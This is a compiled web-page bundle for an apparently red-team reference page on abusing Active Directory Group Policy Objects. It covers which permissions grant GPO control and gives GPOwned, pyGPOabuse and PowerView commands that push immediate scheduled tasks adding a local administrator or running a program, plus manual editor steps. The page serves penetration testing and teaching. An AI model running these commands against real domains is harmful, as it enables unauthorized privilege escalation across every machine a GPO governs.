import{_ as h,c as d,a5 as o,G as t,w as s,B as l,o as p,j as e,a}from"./chunks/framework.B5CpDqM0.js";const f=JSON.parse('{"title":"Group policies","description":"","frontmatter":{"authors":"ShutdownRepo"},"headers":[],"relativePath":"ad/movement/group-policies.md","filePath":"ad/movement/group-policies.md","lastUpdated":1724982529000}'),c={name:"ad/movement/group-policies.md"};function k(u,i,g,m,b,y){const r=l("PluginTabsTab"),n=l("PluginTabs");return p(),d("div",null,[i[2]||(i[2]=o('<h1 id="group-policies" tabindex="-1">Group policies <a class="header-anchor" href="#group-policies" aria-label="Permalink to &quot;Group policies&quot;">​</a></h1><h2 id="theory" tabindex="-1">Theory <a class="header-anchor" href="#theory" aria-label="Permalink to &quot;Theory&quot;">​</a></h2><p>&quot;Group Policy&quot; is a management feature of Active Directory. It allows admins to manage computers and users. Group Policy Objetcs (GPOs) make up Group Policies. GPOs are associated to AD objects (sites, domains, organizational units (OUs)).</p><blockquote><p>Group Policies can include security options, registry keys, software installation, and scripts for startup and shutdown and domain members refresh group policy settings every 90 minutes by default (5 minutes for Domain Controllers). This means that Group Policy enforces configured settings on the targeted computer.</p><p><a href="https://adsecurity.org/?p=2716" target="_blank" rel="noreferrer">adsecurity.org</a></p></blockquote><p>In certain scenarios, an attacker can gain control over GPOs. Some ACEs can give that control (see <a href="https://www.blackhat.com/docs/us-17/wednesday/us-17-Robbins-An-ACE-Up-The-Sleeve-Designing-Active-Directory-DACL-Backdoors-wp.pdf" target="_blank" rel="noreferrer">this BlackHat talk</a>, page 28):</p><ul><li><code>WriteProperty</code> to the <code>GPC-File-Sys-Path</code> property of a GPO (specific GUID specified)</li><li><code>GenericAll</code>, <code>GenericWrite</code>, <code>WriteProperty</code> to any property (no GUID specified)</li><li><code>WriteDacl</code>, <code>WriteOwner</code></li></ul><h2 id="practice" tabindex="-1">Practice <a class="header-anchor" href="#practice" aria-label="Permalink to &quot;Practice&quot;">​</a></h2><p>GPO-based attacks can be conducted with <a href="https://github.com/PowerShellMafia/PowerSploit/blob/26a0757612e5654b4f792b012ab8f10f95d391c9/Recon/PowerView.ps1#L5907-L6122" target="_blank" rel="noreferrer">New-GPOImmediateTask</a> (<a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1" target="_blank" rel="noreferrer">PowerView</a> module), <a href="https://github.com/FSecureLABS/SharpGPOAbuse" target="_blank" rel="noreferrer">SharpGPOAbuse</a> (C#), or <a href="https://github.com/Hackndo/pyGPOAbuse" target="_blank" rel="noreferrer">pyGPOabuse</a> (python) and <a href="https://github.com/X-C3LL/GPOwned" target="_blank" rel="noreferrer">GPOwned</a> (Python) for UNIX-like systems.</p><h3 id="immediate-scheduled-task" tabindex="-1">Immediate Scheduled Task <a class="header-anchor" href="#immediate-scheduled-task" aria-label="Permalink to &quot;Immediate Scheduled Task&quot;">​</a></h3><p>An attacker can edit the GPO to add a scheduled task that runs instantly and removes itself after, every time Group Policy refreshes. The attacker can then gain access to all AD objects this GPO applies to.</p>',10)),t(n,null,{default:s(()=>[t(r,{label:"UNIX-like"},{default:s(()=>i[0]||(i[0]=[e("p",null,[a("From UNIX-like systems, a new immediate scheduled task can be created with "),e("a",{href:"https://github.com/X-C3LL/GPOwned",target:"_blank",rel:"noreferrer"},"GPOwned"),a(" (Python) or added to an existing GPO with "),e("a",{href:"https://github.com/Hackndo/pyGPOAbuse",target:"_blank",rel:"noreferrer"},"pyGPOabuse"),a(" (Python).")],-1),e("div",{class:"language-bash vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"bash"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# GPOwned (buggy, not to use in production) - execute something (e.g. calc.exe)")]),a(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"GPOwned"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -u"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'user'"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -p"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'password'"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -d"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'domain'"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -dc-ip"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'domaincontroller'"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -gpoimmtask"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -name"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," '{12345677-ABCD-9876-ABCD-123456789012}'"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -author"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'DOMAIN\\Administrator'"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -taskname"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'Some name'"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -taskdescription"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'Some description'"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -dstpath"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'c:\\windows\\system32\\calc.exe'")]),a(`
`),e("span",{class:"line"}),a(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# pyGPOabuse, update an existing GPO - add a local admin")]),a(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"pygpoabuse"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'domain'/'user':'password'"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -gpo-id"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "12345677-ABCD-9876-ABCD-123456789012"')])])])],-1)])),_:1}),t(r,{label:"Windows"},{default:s(()=>i[1]||(i[1]=[e("p",null,[a("From Windows, a new immediate scheduled task can be created with "),e("a",{href:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1",target:"_blank",rel:"noreferrer"},"Powerview"),a("'s "),e("a",{href:"https://github.com/PowerShellMafia/PowerSploit/blob/26a0757612e5654b4f792b012ab8f10f95d391c9/Recon/PowerView.ps1#L5907-L6122",target:"_blank",rel:"noreferrer"},"New-GPOImmediateTask"),a(" module (Powershell). In the following example, a user is added to the local administrators group.")],-1),e("div",{class:"language-bash vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"bash"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"New-GPOImmediateTask"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -Verbose"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -Force"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -TaskName"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'TaskName'"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -GPODisplayName"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'GPODisplayName'"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -Command"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," cmd"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -CommandArguments"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "/c net localgroup administrators shutdown /add"')])])])],-1),e("p",null,"After a successful execution, the scheduled task can be removed with the following command.",-1),e("div",{class:"language-bash vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"bash"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"New-GPOImmediateTask"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -Force"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -Remove"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -GPODisplayName"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'GPODisplayName'")])])])],-1)])),_:1})]),_:1}),i[3]||(i[3]=o('<h3 id="manually-adding-a-user-to-the-local-admin-group" tabindex="-1">Manually adding a user to the local admin group <a class="header-anchor" href="#manually-adding-a-user-to-the-local-admin-group" aria-label="Permalink to &quot;Manually adding a user to the local admin group&quot;">​</a></h3><p>An attacker can also manually add a user to the local administrator group. This can be achieved with the Group Policy Management Editor.</p><p>Step 1: create the user</p><p><code>Windows search bar &gt; Group Policy Management Editor &gt; Computer configuration &gt; Preferences &gt; Control Panel Settings &gt; Local Users and Groups &gt; Right click on it &gt; New &gt; Local User &gt; Action: Create &gt; User name: </code></p><p>Step 2: add the user to the local admin group</p><p><code>Windows search bar &gt; Group Policy Management Editor &gt; Computer configuration &gt; Preferences &gt; Control Panel Settings &gt; Local Users and Groups &gt; Right click on it &gt; New &gt; Local User &gt; Action: Update &gt; Group name : &gt; Members: Add: </code></p><h3 id="force-group-policy-update" tabindex="-1">Force Group Policy update <a class="header-anchor" href="#force-group-policy-update" aria-label="Permalink to &quot;Force Group Policy update&quot;">​</a></h3><p>Domain members refresh group policy settings every 90 minutes by default but it can locally be forced with the following command: <code>gpupdate /force</code>.</p><h3 id="other-exploitation-paths" tabindex="-1">Other exploitation paths <a class="header-anchor" href="#other-exploitation-paths" aria-label="Permalink to &quot;Other exploitation paths&quot;">​</a></h3><p>In addition to the aforementioned exploitation paths, GPOs can be abused in other ways: leveraging logon/logoff scripts, using registry for autoruns, installing .msi, edit services and similar code execution avenues.</p><h2 id="resources" tabindex="-1">Resources <a class="header-anchor" href="#resources" aria-label="Permalink to &quot;Resources&quot;">​</a></h2><p><a href="https://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/" target="_blank" rel="noreferrer">https://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/</a></p><p><a href="https://adsecurity.org/?p=2716" target="_blank" rel="noreferrer">https://adsecurity.org/?p=2716</a></p><p><a href="https://beta.hackndo.com/gpo-abuse-with-edit-settings/" target="_blank" rel="noreferrer">https://beta.hackndo.com/gpo-abuse-with-edit-settings/</a></p>',14))])}const C=h(c,[["render",k]]);export{f as __pageData,C as default};
